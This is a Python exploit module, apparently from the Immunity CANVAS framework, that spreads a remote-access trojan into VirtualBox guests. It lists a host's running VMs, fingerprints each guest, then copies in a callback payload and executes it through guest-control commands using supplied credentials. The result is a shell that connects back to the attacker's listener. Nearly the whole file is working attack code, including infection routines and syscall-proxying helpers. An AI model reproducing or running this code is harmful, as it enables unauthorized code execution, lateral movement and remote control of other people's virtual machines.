#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  vbox_vm_exec_cmd.py
## Description:
##            :
## Created_On :  Mon Mar 25 2019
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import re
import struct
import socket
import time
import gzip
import random
import logging
from timeit import default_timer as timer

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvaserror import *
from libs.canvasos import canvasos
import canvasengine
from ExploitTypes.utility import Utility
from tcpexploit import *

# virtualization API
import libs.virtualization.virtualbox.libvboxmanage as vboxmanage

NAME                     = "vbox_vm_exec_cmd"
DESCRIPTION              = "Executes a mosdef payload within a VirtualBox VM."
VERSION                  = "1.0"
GTK2_DIALOG              = "dialog.glade2"

PROPERTY                 = {}
PROPERTY['TYPE']         = "Commands"
PROPERTY['ARCH']         = [ ["Linux"], ["Windows"] ]
PROPERTY['VERSION']      = [ "All" ]
PROPERTY['SITE']         = "Trojans"

DOCUMENTATION            = {}
DOCUMENTATION["Warning"] = "Can only be used from a Linux node for now and currently restricted to VirtualBox 5.2.x and 6.0.x"
DOCUMENTATION["Notes"]   = """

This exploit uses command injection to achieve the RCE and as such requires proper
credentials contrary to the keystroke injection exploit. It also requires virtualbox
guest additions to be installed within the VM and running. However the exploit still
works even when the session is locked.

This attack is not exploiting any bug but rather a feature. It is thus unlikely
to be ever patched.
"""

###
# Globals
###

NBR_ATTEMPTS = 5
CANONICAL_ADDR_LOWER_KERNEL = 0xFFFF800000000000L
CANONICAL_ADDR_UPPER_KERNEL = 0xFFFFFFFFFFFFFFFFL
MOSDEF_LINUX_CALLBACK_PATH  = '/tmp/cb'

###
# The main class
###

class theexploit(tcpexploit):

    ###
    # Class's API.
    ###

    def __init__(self):
        tcpexploit.__init__(self)
        self.result            = ""
        self.name              = NAME
        self.local_path        = os.path.dirname(__file__)
        self.clientname        = None
        self.payload_fname     = None
        self.debug             = False
        self.respath           = os.path.abspath(os.path.join(self.local_path, "Resources/"))
        self.node_fd           = None
        self.node_vboxsvc_path = None
        self.with_timer        = True
        self.username          = ''
        self.password          = ''
        self.domain            = ''

        if not os.path.exists(self.respath): os.mkdir(self.respath)

    def getargs(self):
        '''
        The arguments handling function
        '''

        self.username = self.argsDict.get('username', self.username)
        self.password = self.argsDict.get('password', self.password)
        self.domain = self.argsDict.get('domain', self.domain)
        self.debug = bool(self.argsDict.get('debug', self.debug))
        if self.debug:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def build_universal_trojan(self, os_version="Linux", os_arch="X64"):
        '''
        Builds the callback.
        os_version must be "Linux" or "WINDOWS"
        os_arch must be "X86" or "X64"
        '''

        t_os = canvasos(os_version)
        t_os.arch = os_arch

        logging.info("Callback set to %s:%s" % (self.callback.ip, self.callback.port))

        try:
            ret = self.buildmosdeftrojan(self.callback.ip,
                                         self.callback.port,
                                         target_os=t_os,
                                         universal=True,
                                         http=False,
                                         ssl=False)
            if ret:
                if os_version == 'WINDOWS':
                    cb_name = "cb_%s.exe" % os_arch
                else:
                    cb_name = "cb.linux.%s" % os_arch
                filename = os.path.join(self.respath, cb_name)
                with open(filename,"wb") as f:
                    f.write(self.mosdeftrojan)
                self.payload_fname = filename
        except Exception, err:
            logging.error("Problem building MOSDEF trojan: %s" % str(err))
            return False
        else:
            return True


    ###
    # VBOX - Common API
    ###


    def vbox_common_getproperty(self, target_iid, property_str):
        '''
        Returns the value associated with a specific property stored within the IMachine class (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, value = vboxmanage.vboxmanage_guestproperty_get(target_iid, property_str, handlers=self.handlers)
            if not status:
                return 0, value

        return status, None


    def vbox_common_osdetect(self, target_iid):
        '''
        Loads all DBGF plug-in and detects the OS version (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, value = vboxmanage.vboxmanage_debugvm_osdetect(target_iid, handlers=self.handlers)
            if not status:
                return 0, value

        return status, None


    def vbox_common_getregisters(self, target_iid, registers):
        '''
        Returns the registers values by calling the IMachineDebugger class (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, reg_values = vboxmanage.vboxmanage_debugvm_getregisters(target_iid, registers=registers, handlers=self.handlers)
            if not status:
                return 0, reg_values

        return status, None


    def vbox_common_run_command(self, target_iid, cmdline, sync=True, nr_attempts=NBR_ATTEMPTS):
        '''
        Executes a command inside the VM (WRAPPER)
        Note1: Requires the GUEST ADDITIONS installed.
        Note2: Depending on whether we need the output of not we call the _run or the _start API.
        '''

        creds = {}
        creds['user'] = self.username
        creds['password'] = self.password
        creds['domain'] = self.domain

        for i in xrange(nr_attempts):
            if sync:
                status, x = vboxmanage.vboxmanage_guestcontrol_run(target_iid, cmdline, creds=creds, handlers=self.handlers)
                if not status:
                    pid, stdout_log, stderr_log = x
                    return 0, stdout_log
            else:
                status, x = vboxmanage.vboxmanage_guestcontrol_start(target_iid, cmdline, creds=creds, handlers=self.handlers)
                if not status:
                    pid = x[0]
                    return 0, ''

            logging.info('Attempt %d / %d failed! [err:%d]' % (i+1,nr_attempts,status))

        return -1, None


    def vbox_common_copyto(self, target_iid, src, dst, nr_attempts=NBR_ATTEMPTS):
        '''
        Pushes a local file within the VM (WRAPPER).
        Note: Requires the GUEST ADDITIONS installed.
        '''

        # Step1. If the node is not local, we need to push the binary on the target first!
        node_type = self.node.nodetype
        if node_type != "LocalNode":
            logging.info('Non local node requires an upload of the payload first!')
            dst_file = '/tmp/cb_%s' % os.urandom(4).encode('hex')
            self.node.shell.upload(src, destfilename = dst_file)
            # The new source becomes the destination of the previous upload
            src_file = dst_file
        else:
            # The new source is the old source since we are local.
            src_file = src

        creds = {}
        creds['user'] = self.username
        creds['password'] = self.password
        creds['domain'] = self.domain

        for i in xrange(nr_attempts):
            status, x = vboxmanage.vboxmanage_guestcontrol_copyto(target_iid, src_file, dst, creds=creds, handlers=self.handlers)
            if not status:
                return 0

            logging.info('Attempt %d / %d failed! [err:%d]' % (i+1,nr_attempts,status))

        return -1

    ###
    # Guessing functions
    ###


    def is_vbox_running(self):
        '''
        Returns True if the LocalNode is a virtualbox host, False otherwise.
        '''

        ipcc = vboxmanage.IPC_class()
        ipcc.set_handlers(self.handlers)
        ret, e = ipcc.start()
        if ret:
            return False
        ipcc.send_clienthello()
        ipcc.define_target()
        ret = ipcc.resolve_clientname()
        if not ret:
            self.clientname = ipcc.client_name
            logging.info('Found VirtualBox %s' % self.clientname)

        ipcc.close_connection()
        return True


    def guess_vm_architecture(self, iid_str):
        '''
        Detects if the VBOX VM is running a 32 or a 64 bits intel VM.
        Note: Unfortunately even with 32 bits VM, extended registers are accepted
        which is why even 32 bits VM will answer positively to RIP, RSP, etc.. while
        it makes little sense architecture wise. For that reason, we use heuristics
        based on the values of the registers always containing pointers.
        Another way, possibly faster would be through segment selectors as they are
        supposed to be stable.
        '''

        score = 0
        reg_names = ['rip','rsp','rbp']

        # This should be well enough to reach kernel land
        for i in xrange(NBR_ATTEMPTS):

            status, reg_values = self.vbox_common_getregisters(iid_str, reg_names)
            if status:
                logging.debug('Dropping sample')
                continue

            for reg_name in reg_names:
                if reg_values.has_key(reg_name):
                    try:
                        current_val = int(reg_values[reg_name], 16)
                    except:
                        continue
                    else:
                        score += int(current_val > CANONICAL_ADDR_LOWER_KERNEL and current_val < CANONICAL_ADDR_UPPER_KERNEL)

            if score > 0:
                return 'x64'

        return 'X86'


    def guess_vm_os(self, iid_str):
        '''
        Detects which OS the guest is running.
        Are we running Linux or Windows?
        We use 2 different fingerprint methods.
        '''

        status, os_version = self.vbox_common_getproperty(iid_str, '/VirtualBox/GuestInfo/OS/Product')
        if not status and os_version:
            return 0, os_version
        else:
            return self.vbox_common_osdetect(iid_str)


    ###
    # Infection functions
    ###


    def infect_linux_node(self, iid_str, mosdef_payload):
        '''
        Pushes and executes a modef payload on a Linux VM.
        '''

        callback_path = MOSDEF_LINUX_CALLBACK_PATH

        logging.info('Attempting to copy local:%s to remote:%s' % (self.payload_fname, callback_path))
        ret = self.vbox_common_copyto(iid_str, self.payload_fname, callback_path)
        if ret:
            logging.error('Uploading the mosdef payload failed')
            return -1

        logging.info('Attempting to give +x perm to to remote:%s' % callback_path)
        ret, cmdline = self.vbox_common_run_command(iid_str, '/bin/chmod +x ' + callback_path)
        if ret:
            logging.error('Calling chmod failed!')
            return -2

        logging.info('Attempting to execute the mosdef payload')
        ret, _ = self.vbox_common_run_command(iid_str, callback_path, sync=False)
        if ret:
            logging.error('Executing the mosdef payload failed!')
            return -3

        logging.info('Execution was likely a success, we should get a shell')
        return 0


    def infect_windows_node(self, iid_str, mosdef_payload):
        '''
        Pushes and executes a modef payload on a Windows VM.
        '''

        logging.info('Attempting to locate a TEMP directory in which we can write files')
        ret, tmp_directory = self.vbox_common_run_command(iid_str, 'C:\\Windows\\System32\\cmd.exe /C echo %TEMP%')
        if ret:
            logging.error('Locating the TEMP directory failed')
            return -1

        logging.info('Got: %s' % tmp_directory)
        callback_path = tmp_directory.replace('"','').rstrip() + '\\cb.exe'

        logging.info('Attempting to copy local:%s to remote:%s' % (self.payload_fname, callback_path))
        ret = self.vbox_common_copyto(iid_str, self.payload_fname, callback_path)
        if ret:
            logging.error('Uploading the mosdef payload failed')
            return -2

        logging.info('Attempting to execute the mosdef payload')
        ret, cmdline = self.vbox_common_run_command(iid_str, callback_path, sync=False)
        if ret:
            logging.error('Executing the mosdef payload failed!')
            return -3

        logging.info('Execution was likely a success, we should get a shell')
        return 0


    def infect_node(self, iid_str, os_version, mosdef_payload=None):
        '''
        Small wrapper redirecting to the correct infection API.
        '''

        if mosdef_payload:
            word = 'using'
        else:
            word = 'without'
        logging.info('Attempting infection on {%s} %s a payload using credentials l/p: %s/%s' % (iid_str, word, self.username, self.password))
        if os_version.upper() == 'WINDOWS':
            return self.infect_windows_node(iid_str, mosdef_payload)
        else:
            return self.infect_linux_node(iid_str, mosdef_payload)


    def infect_all_nodes(self):
        '''
        Performs the infection process.
        '''

        # First of all we need to retrieve the list of VMs (name+IID)
        # This is equivalent to vboxmanage list runningvms
        logging.info("Listing up and running VMs")

        start = timer()
        ret, vms = vboxmanage.vboxmanage_list_runningvms(handlers=self.handlers)
        if ret:
            logging.error('An error prevented us from retrieving the list of running vms! [err:%x]' % ret)
            return 0

        end = timer()
        logging.debug('Took %ss to complete vboxmanage_list_runningvms()' % (end-start))

        if not len(vms):
            logging.error('No running VMs to infect for now, please retry later.')
            return 1

        logging.info('Found %d running VMs' % len(vms))

        # Now we need to detect the hostinformation!
        for vm in vms:

            logging.info('Attacking \"%s\" - {%s}' % (vm['name'], vm['iid']))

            # 1. Fingerprinting (1/2)

            logging.info('Fingerprinting the OS')
            ret, vm_guest_os = self.guess_vm_os(vm['iid'])
            if ret or not vm_guest_os:
                logging.warn('Could not fingerprint correctly the VM, the API is mostly broken, skipping VM.')
                continue

            is_windows = 'windows' in vm_guest_os.lower() or 'winnt' in vm_guest_os.lower()
            is_linux = 'linux' in vm_guest_os.lower()

            if not is_windows and not is_linux:
                logging.info('Unhandled type of VM, skipping [ver:\"%s\"]' % vm_guest_os)
                continue

            if is_windows:
                os_version="WINDOWS"
                logging.info('A Windows OS was detected!')
            else:
                os_version="Linux"
                logging.info('A Linux OS was detected!')

            # 2. Fingerprinting (2/2)
            logging.info('Fingerprinting the architecture')
            os_arch = self.guess_vm_architecture(vm['iid'])
            logging.info('A %s (%s) VM was detected [ver:\"%s\"]' % (os_version, os_arch, vm_guest_os))

            logging.info('Creating the mosdef payload')
            ret = self.build_universal_trojan(os_version=os_version,
                                              os_arch=os_arch)

            if not ret:
                logging.error('Building payload failed, skipping VM')
                continue

            # 3. Performing the infection
            logging.info('Attempting to inject the payload')
            ret = self.infect_node(vm['iid'], os_version, self.mosdeftrojan)
            if ret:
                logging.error('Infecting %s was a failure! [err: %d]' % (vm['iid'],ret))
                continue

            # At this point, did we get something?
            infected = False
            for i in xrange(2*NBR_ATTEMPTS):
                time.sleep(1)
                if self.ISucceeded():
                    infected = True
                    break
                logging.info('Waiting...')

            if infected:
                logging.info('Injection was a success, got a shell!')
            else:
                logging.info('Injection failed!')

        return 1

    ###
    # Syscall proxying
    ###


    def node_create_connection(self, server_address):
        '''
        Creates a socket and connects to the unix path.
        '''

        code = """
        #import "string", "srv_sockname" as "srv_sockname"
        #import "local", "socket" as "socket"
        #import "local", "connect" as "connect"
        #import "local", "memset" as "memset"
        #import "local", "sendint" as "sendint"
        #import "local", "strcpy" as "strcpy"
        #import "local", "setsockopt" as "setsockopt"

        struct sockaddr_un {
            unsigned short sun_family;
            char        sun_path[108];
        };

        struct timeval {
            long tv_sec;
            long tv_usec;
        };

        void main()
        {
            struct sockaddr_un srv_addr;
            int res;
            int sock;
            struct timeval tv;

            memset(srv_addr.sun_path, 0, 108);
            srv_addr.sun_family = 1; // AF_UNIX
            strcpy(srv_addr.sun_path, srv_sockname);
            sock = socket(1, 1, 0); // socket(AF_UNIX, SOCK_STREAM, 0);
            sendint(sock);
            if(sock < 0)
            {
                return;
            }
            res = connect(sock, &srv_addr, 110);
            sendint(res);

            tv.tv_sec = 2;
            tv.tv_usec = 0;

            res = setsockopt(sock, 1, 20, &tv, 16); // SOL_SOCKET=1, SO_RCVTIMEO=20
            sendint(res);

            return;
        }
        """

        logging.debug('SP: create_connection')
        self.node.shell.clearfunctioncache()
        req = self.node.shell.compile(code, { 'srv_sockname' : server_address })
        self.node.shell.sendrequest(req)

        # socket()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -1, "Failed to create Unix Domain Socket [err:%d]" % ret

        self.node_fd = ret
        logging.debug("Unix Domain socket created: %d" % self.node_fd)

        # connect()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            self.node_close_connection()
            return -2, "Failed connect to %s" % server_address

        logging.debug("Connected to Unix Domain socket (%s) [err:%d]" % (server_address,ret))

        # setsockopt()
        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            logging.warn("setsockopt failed [err:%d]" % ret)
        else:
            logging.debug('Successfully set socket timer to 2s!')

        self.node.shell.leave()
        return 0, None


    def node_close_connection(self):
        '''
        Closes the unix socket
        '''

        if self.node_fd:
            self.node.shell.close(self.node_fd)


    def node_find_socket(self):
        '''
        Search remotely for a specific unix socket.
        Returns the fullpath if successfull.
        '''

        # Singleton design pattern to boost performance
        if self.node_ipcd_path:
            return self.node_ipcd_path

        dir_list = self.node.shell.dodir('/tmp')
        if not dir_list:
            return None

        re_exp = re.compile(vboxmanage.UNIX_SOCKET_NAME_TEMPLATE)
        for x in dir_list:
            candidate, _ = x
            if re_exp.search(candidate):
                try:
                    candidate_fullpath = '/tmp/%s/ipcd' % candidate
                    ret, _ = self.node.shell.stat(candidate_fullpath)
                    if ret == 0:
                        self.node_ipcd_path = candidate_fullpath
                        return candidate_fullpath
                except Exception as e:
                    continue
        return None


    def _write(self, fd, data):
        '''
        Writes all the data in data to fd
        '''

        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "write" as "write"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int ret;
            ret = write(fd, buffer, length);
            sendint(ret);
        }
        """

        vars = {}
        vars["fd"] = fd
        vars["length"] = len(data)
        vars["buffer"] = data

        #self.node.shell.clearfunctioncache()
        message = self.node.shell.compile(code,vars)
        self.node.shell.sendrequest(message)
        ret = self.node.shell.readint(signed=True)
        self.node.shell.leave()
        if ret < 0:
            return -1
        return 0


    def _read(self, fd):
        '''
        Reads a length sent on the socket then read the whole payload
        '''

        code="""
        #import "int", "fd" as "fd"
        #import "local", "read" as "read"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int ret;
            char *p;
            char buffer[2048];
            int data_length;

            data_length = 0;
            p = &data_length;
            ret = read(fd, p, 4);
            sendint(ret);
            if(ret > 0)
            {
                sendint(data_length);
                p = buffer;
                data_length = data_length - 4;
                ret = read(fd, p, data_length);
                sendint(ret);
                if (ret > 0)
                {
                    sendblock2self(buffer, ret);
                }
            }
        }
        """

        #self.node.shell.clearfunctioncache()
        message = self.node.shell.compile(code, { "fd": fd })
        self.node.shell.sendrequest(message)

        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -1, None

        data_length = self.node.shell.readint(signed=True)

        ret = self.node.shell.readint(signed=True)
        if ret < 0:
            self.node.shell.leave()
            return -2, None

        if ret == 0:
            self.node.shell.leave()
            return -3, None

        data = self.node.shell.readblock()
        self.node.shell.leave()
        return 0, struct.pack('<L', data_length) + data

    def node_send_receive(self, payload):
        '''
        Remote write & read of data on the socket, returns what is read.
        '''

        logging.debug('SP: send_receive')
        try:
            ret = self._write(self.node_fd, payload)
            if ret:
                logging.info('node_send_receive() failed to write payload!')
                return None

            time.sleep(0.01)
            ret, data = self._read(self.node_fd)
            if ret:
                logging.info('node_send_receive() failed to recv payload! [err=%x]' % ret)
                return None
            else:
                return data
        except Exception as e:
            logging.info('Error detected in node_send_receive(): %s' % str(e))
            return None


    def node_receive(self):
        '''
        Remote read of data on the socket, returns what is read.
        '''

        logging.debug('SP: receive')
        try:
            time.sleep(0.01)
            ret, data = self._read(self.node_fd)
            if ret:
                logging.info('node_receive() failed to recv payload!')
                return None
            return data
        except Exception as e:
            logging.info('Error detected in node_receive(): %s' % str(e))
            return None


    def get_vbox_version(self):
        '''
        Retrieves the VirtualBox version using a grep like search.
        '''

        # Singleton design pattern to boost performance
        if self.node_vboxsvc_path:
            return self.node_vboxsvc_path

        candidates_files = [ "/usr/lib/virtualbox/components/VBoxSVCM.so" ]

        for candidate in candidates_files:

            O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
            fd = self.node.shell.open(candidate, O_RDONLY)
            if fd < 0:
                logging.error('Reading of %s failed' % candidate)
                return 0

            data = self.node.shell.readall(fd)
            self.node.shell.close(fd)

            re_exp = re.compile('VBoxSVC-[0-9]+.[0-9]+.[0-9]+[_a-zA-Z]*\0')
            ret = re_exp.search(data)
            if ret:
                res = ret.group(0)
                self.node_vboxsvc_path = res
                return res



    ###
    # Entry point - testing/debugging only
    ###

    def run(self):
        self.setInfo("%s (in progress)"%(NAME))

        # Fetching the arguments
        self.getargs()

        # Patching the callback. By default CANVAS may use a localhost/localport
        # callback if no 'target' is specified even if the callback interface is
        # correctly set.

        self.callback = self.engine.autoListener(self,
                                                 canvasengine.UNIVERSAL_MOSDEF,
                                                 host=self.engine.callback_interface,
                                                 autoFind=False)

        for node in self.argsDict["passednodes"]:

            self.node = node
            node_type = node.nodetype
            node_name = node.getname()

            # Initialization of the two remote paths.
            self.node_vboxsvc_path = None
            self.node_ipcd_path = None

            # We can only infect Linux hosts for now
            if not "Unix Shell" in node.capabilities:
                logging.info("Node %s is not a Linux host, skipping" % node_name)
                continue

            # If the host is local then we must use the default handlers from the library
            if node_type == "LocalNode":
                logging.info('Using local handlers')
                self.handlers = None
                self.with_timer = True

            # If the host is a remote Linux node AND if it has a shell (which should
            # always be the case practically speaking, then we may define new handlers
            # for syscall proxying.
            elif node_type == 'linuxNode':

                if hasattr(node, 'shell') and node.shell:
                    logging.info('Using syscall proxying handlers')
                    self.with_timer = False
                    self.handlers = { 'find_socket':       self.node_find_socket,
                                      'create_connection': self.node_create_connection,
                                      'close_connection':  self.node_close_connection,
                                      'send_receive':      self.node_send_receive,
                                      'receive':           self.node_receive,
                                      'get_vbox_version':  self.get_vbox_version,
                                    }
                else:
                    logging.warn('Skipping broken Linuxnode %s' % (node_name))
                    continue
            else:
                logging.warn('Skipping unhandled Unix shell %s' % (node_name))
                continue

            # Is vbox running?
            ret = self.is_vbox_running()
            if not ret:
                logging.debug('Not a host running VirtualBox')
                continue

            logging.info('Node %s is a Virtualbox Host!' % node_name)
            self.infect_all_nodes()

        self.setInfo("%s - done (success)"%(NAME))
        return 1


if __name__== "__main__":
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
